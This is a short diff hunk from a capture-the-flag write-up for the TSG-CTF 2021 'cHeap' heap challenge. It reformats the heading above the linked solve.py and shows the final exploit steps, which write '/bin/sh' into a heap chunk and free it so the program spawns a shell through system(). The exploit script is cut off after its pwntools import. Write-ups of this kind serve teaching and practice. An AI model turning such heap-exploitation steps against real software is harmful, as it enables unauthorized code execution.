@@ -203,7 +203,9 @@ create(0x10, b'/bin/sh\n') #create a chunk with str “/bin/sh”
 delete() # free it, the program will call system(“/bin/sh”)
 ```
 
-## Final exploit [solve.py](/2021/TSG-CTF/cHeap/solve.py)
+## Final exploit 
+
+File [solve.py](/2021/TSG-CTF/cHeap/solve.py)
 
 ```python
 from pwn import *
